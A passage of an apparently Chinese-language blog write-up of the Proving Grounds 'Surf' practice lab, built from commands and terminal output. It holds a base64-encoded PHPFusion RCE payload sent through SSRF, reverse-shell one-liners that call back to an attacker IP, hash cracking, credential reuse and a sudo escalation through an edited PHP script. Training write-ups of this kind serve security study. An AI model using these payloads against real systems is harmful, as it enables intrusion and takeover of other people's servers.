+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Woltlab Burning Board 4.x 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> bcrypt 
+</span></span><span class="line"><span class="cl">                                                                                                                                                                                                              
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ <span class="nb">echo</span> <span class="s1">&#39;$2y$10$7y1lSqjchay03PgTMMW6a.wtR9CosWV4tLSaycUhcXQLvT.PJtiLm&#39;</span> &gt; james.hash
+</span></span><span class="line"><span class="cl">                                                                                                                                                                                                              
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ hashcat -h <span class="p">|</span> grep -i bcrypt                                                                                       
+</span></span><span class="line"><span class="cl">   <span class="m">3200</span> <span class="p">|</span> bcrypt <span class="nv">$2</span>*$, Blowfish <span class="o">(</span>Unix<span class="o">)</span>                               <span class="p">|</span> Operating System
+</span></span><span class="line"><span class="cl">  <span class="m">25600</span> <span class="p">|</span> bcrypt<span class="o">(</span>md5<span class="o">(</span><span class="nv">$pass</span><span class="o">))</span> / bcryptmd5                             <span class="p">|</span> Forums, CMS, E-Commerce
+</span></span><span class="line"><span class="cl">  <span class="m">25800</span> <span class="p">|</span> bcrypt<span class="o">(</span>sha1<span class="o">(</span><span class="nv">$pass</span><span class="o">))</span> / bcryptsha1                           <span class="p">|</span> Forums, CMS, E-Commerce
+</span></span><span class="line"><span class="cl">  <span class="m">28400</span> <span class="p">|</span> bcrypt<span class="o">(</span>sha512<span class="o">(</span><span class="nv">$pass</span><span class="o">))</span> / bcryptsha512                       <span class="p">|</span> Forums, CMS, E-Commerce
+</span></span><span class="line"><span class="cl">                                                                                                                                                                                                              
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ hashcat -m <span class="m">3200</span> james.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这是个兔子洞</p>
+<p>又找到了另一个点</p>
+<p><a class="lightgallery" href="/posts/provinggrounds-surf/resource/index.assets/image-20231203175500444.png?size=large" data-thumbnail="/posts/provinggrounds-surf/resource/index.assets/image-20231203175500444.png?size=small" data-sub-html="<h2>image-20231203175500444</h2>"><img loading="lazy" src="/posts/provinggrounds-surf/resource/index.assets/image-20231203175500444.png" alt="image-20231203175500444" srcset="/posts/provinggrounds-surf/resource/index.assets/image-20231203175500444.png?size=small, /posts/provinggrounds-surf/resource/index.assets/image-20231203175500444.png?size=medium 1.5x, /posts/provinggrounds-surf/resource/index.assets/image-20231203175500444.png?size=large 2x" data-title="image-20231203175500444" style="--width: 1654px;--aspect-ratio: 1654 / 800;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
+<p>搜索历史漏洞发现有RCE</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ searchsploit phpfusion
+</span></span><span class="line"><span class="cl">-------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl"> Exploit Title                                                <span class="p">|</span>  Path
+</span></span><span class="line"><span class="cl">-------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl">PHPFusion 9.03.50 - Persistent Cross-Site Scripting           <span class="p">|</span> php/webapps/48497.txt
+</span></span><span class="line"><span class="cl">PHPFusion 9.03.50 - Remote Code Execution                     <span class="p">|</span> php/webapps/49911.py
+</span></span><span class="line"><span class="cl">PHPFusion 9.10.30 - Stored Cross-Site Scripting <span class="o">(</span>XSS<span class="o">)</span>         <span class="p">|</span> php/webapps/51411.txt
+</span></span><span class="line"><span class="cl">-------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl">Shellcodes: No Results
+</span></span><span class="line"><span class="cl">Papers: No Results</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过SSRF打漏洞</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/administration/checkserver.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">192.168.162.171</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">229</span>
+</span></span><span class="line"><span class="cl"><span class="n">Origin</span><span class="o">:</span> <span class="l">http://192.168.162.171</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://192.168.162.171/administration/checkserver.php</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">auth_status=eydzdWNjZXNzJzondHJ1ZSd9; PHPSESSID=2uojiamq1deog17k1vbe1t5p1s</span>
+</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">url=http%3A%2F%2F127.0.0.1%3A8080//infusions/downloads/downloads.php?cat_id=$%5C%7Bsystem(base64_decode(cGhwIC1yICckc29jaz1mc29ja29wZW4oIjE5Mi4xNjguNDUuMTk3Iiw5MDAyKTtleGVjKCIvYmluL2Jhc2ggLWkgPCY0ID4mNCAyPiY0Iik7JyAg)).exit%5C%7D</span></span></code></pre></td></tr></table>
+</div>
+</div><p>问题是shell一连上就直接断了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nc -nlvp <span class="m">9002</span> 
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9002</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.45.197<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.162.171<span class="o">]</span> <span class="m">34322</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>最后成功的payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nv">url</span><span class="o">=</span>http%3A%2F%2F127.0.0.1%3A8080//infusions/downloads/downloads.php?cat_id<span class="o">=</span>$%5C%7Bsystem<span class="o">(</span>base64_decode<span class="o">(</span>cGhwIC1yICdleGVjKCJuYyAxOTIuMTY4LjQ1LjE5NyA4MCAtZSAvYmluL3NoIik7JyAg<span class="o">))</span>.exit%5C%7D
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 解码后</span>
+</span></span><span class="line"><span class="cl">http://127.0.0.1:8080//infusions/downloads/downloads.php?cat_id<span class="o">=</span>$<span class="se">\{</span>system<span class="o">(</span>base64_decode<span class="o">(</span>cGhwIC1yICdleGVjKCJuYyAxOTIuMTY4LjQ1LjE5NyA4MCAtZSAvYmluL3NoIik7JyAg<span class="o">))</span>.exit<span class="se">\}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">php -r <span class="s1">&#39;exec(&#34;nc 192.168.45.197 80 -e /bin/sh&#34;);&#39;</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nc -nlvp <span class="m">80</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">80</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.45.197<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.162.171<span class="o">]</span> <span class="m">54366</span>
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></span><span class="line"><span class="cl">ls /home/
+</span></span><span class="line"><span class="cl">james
+</span></span><span class="line"><span class="cl">ls /home/james/
+</span></span><span class="line"><span class="cl">local.txt
+</span></span><span class="line"><span class="cl">cat /home/james/local.txt
+</span></span><span class="line"><span class="cl">a4e66109b23dd0df9165c992668efe14
+</span></span><span class="line"><span class="cl">python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">www-data@Surf:/var/www/html/infusions/downloads$</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="权限提升" class="heading-element"><span>权限提升</span>
+  <a href="#%e6%9d%83%e9%99%90%e6%8f%90%e5%8d%87" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>linpeas信息搜集</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╔══════════╣ Searching passwords in config PHP files
+</span></span><span class="line"><span class="cl"><span class="nv">$locale</span><span class="o">[</span><span class="s1">&#39;853&#39;</span><span class="o">]</span> <span class="o">=</span> <span class="s2">&#34;Admin Password:&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">define<span class="o">(</span><span class="s1">&#39;DB_PASSWORD&#39;</span>, <span class="s2">&#34;FlyToTheMoon213!&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">define<span class="o">(</span><span class="s1">&#39;DB_USER&#39;</span>, <span class="s2">&#34;core&#34;</span><span class="o">)</span><span class="p">;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>拿到密码，试出来是james的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sshpass -p <span class="s1">&#39;FlyToTheMoon213!&#39;</span> ssh james@192.168.162.171
+</span></span><span class="line"><span class="cl">Linux Surf 4.19.0-18-amd64 <span class="c1">#1 SMP Debian 4.19.208-1 (2021-09-29) x86_64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
+</span></span><span class="line"><span class="cl">the exact distribution terms <span class="k">for</span> each program are described in the
+</span></span><span class="line"><span class="cl">individual files in /usr/share/doc/*/copyright.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span class="line"><span class="cl">permitted by applicable law.
+</span></span><span class="line"><span class="cl">$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>james<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>james<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>james<span class="o">)</span>
+</span></span><span class="line"><span class="cl">$ python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">james@Surf:~$ ls
+</span></span><span class="line"><span class="cl">local.txt
+</span></span><span class="line"><span class="cl">james@Surf:~$ cat local.txt 
+</span></span><span class="line"><span class="cl">a4e66109b23dd0df9165c992668efe14
+</span></span><span class="line"><span class="cl">james@Surf:~$ </span></span></code></pre></td></tr></table>
+</div>
+</div><p>查看sudo权限</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">james@Surf:~$ sudo -l
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">We trust you have received the usual lecture from the <span class="nb">local</span> System
+</span></span><span class="line"><span class="cl">Administrator. It usually boils down to these three things:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">#1) Respect the privacy of others.</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#2) Think before you type.</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">#3) With great power comes great responsibility.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> james: 
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> james on Surf:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User james may run the following commands on Surf:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> /usr/bin/php /var/backups/database-backup.php
+</span></span><span class="line"><span class="cl">james@Surf:~$ ls -al /var/backups/database-backup.php 
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> www-data www-data <span class="m">2758</span> Nov  <span class="m">9</span>  <span class="m">2021</span> /var/backups/database-backup.php
+</span></span><span class="line"><span class="cl">james@Surf:~$ </span></span></code></pre></td></tr></table>
+</div>
+</div><p>有思路了，修改PHP文件，sudo执行反弹shell</p>
+<p>切换2个用户太麻烦了，主要是nc的shell不方便修改文件，干脆直接修改权限为777</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@Surf:/var/backups$ chmod <span class="m">777</span> database-backup.php 
+</span></span><span class="line"><span class="cl">www-data@Surf:/var/backups$ ls -l database-backup.php 
+</span></span><span class="line"><span class="cl">-rwxrwxrwx <span class="m">1</span> www-data www-data <span class="m">2829</span> Dec  <span class="m">3</span> 06:07 database-backup.php</span></span></code></pre></td></tr></table>
+</div>
+</div><p>试了下写在文件末尾不行，只能写在前面。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">james@Surf:~$ vi /var/backups/database-backup.php
+</span></span><span class="line"><span class="cl">james@Surf:~$ 
+</span></span><span class="line"><span class="cl">james@Surf:~$ head /var/backups/database-backup.php
+</span></span><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">/**
+</span></span><span class="line"><span class="cl">* Updated: Mohammad M. AlBanna
+</span></span><span class="line"><span class="cl">* Website: MBanna.info
+</span></span><span class="line"><span class="cl">*/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">system<span class="o">(</span><span class="s2">&#34;nc 192.168.45.197 9000 -e /bin/sh&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">james@Surf:~$ sudo /usr/bin/php /var/backups/database-backup.php</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/surf<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nc -nlvp <span class="m">9000</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.45.197<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.162.171<span class="o">]</span> <span class="m">33036</span>
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">ls /root/
+</span></span><span class="line"><span class="cl">proof.txt
+</span></span><span class="line"><span class="cl">cat /root/proof.txt
+</span></span><span class="line"><span class="cl">e58a15c56a6f26de90c3393c15f0bc20</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="lightgallery" href="/posts/provinggrounds-surf/resource/index.assets/image-20231203191808916.png?size=large" data-thumbnail="/posts/provinggrounds-surf/resource/index.assets/image-20231203191808916.png?size=small" data-sub-html="<h2>image-20231203191808916</h2>"><img loading="lazy" src="/posts/provinggrounds-surf/resource/index.assets/image-20231203191808916.png" alt="image-20231203191808916" srcset="/posts/provinggrounds-surf/resource/index.assets/image-20231203191808916.png?size=small, /posts/provinggrounds-surf/resource/index.assets/image-20231203191808916.png?size=medium 1.5x, /posts/provinggrounds-surf/resource/index.assets/image-20231203191808916.png?size=large 2x" data-title="image-20231203191808916" style="--width: 2902px;--aspect-ratio: 2902 / 918;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2024-01-02 20:48:15">更新于 2024-01-02&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/oscp/" class="post-tag" title="标签 - OSCP">OSCP</a><a href="/tags/pg_practice/" class="post-tag" title="标签 - PG_Practice">PG_Practice</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/provinggrounds-exghost/" class="post-nav-item" rel="prev" title="ProvingGrounds Exghost Writeup"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>ProvingGrounds Exghost Writeup</a><a href="/posts/provinggrounds-access/" class="post-nav-item" rel="next" title="ProvingGrounds Access Writeup">ProvingGrounds Access Writeup<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="giscus" class="comment">
+          <script
+            src="https://giscus.app/client.js"
+            data-repo="XavierRoot/XavierBlog"
+            data-repo-id="R_kgDOHswyxg"
+            data-category="Announcements"
+            data-category-id="DIC_kwDOHswyxs4Cd2zm"
+            data-mapping="title"
+            data-strict="0"
+            
+            data-theme="preferred_color_scheme"
+            data-reactions-enabled="1"
+            data-emit-metadata="0"
+            data-input-position="bottom"
+            data-lang="en"
+            data-loading="lazy"
+            crossorigin="anonymous"
+            async
+            defer
+          ></script>
+        </div>
+        <noscript>
+          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
+        </noscript></div></article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/lightgallery/lightgallery.min.js" defer></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js" defer></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="https://vercount.one/js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":20},"comment":{"enable":true,"expired":false,"giscus":{"darkTheme":"dark","lightTheme":"light","origin":"https://giscus.app"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 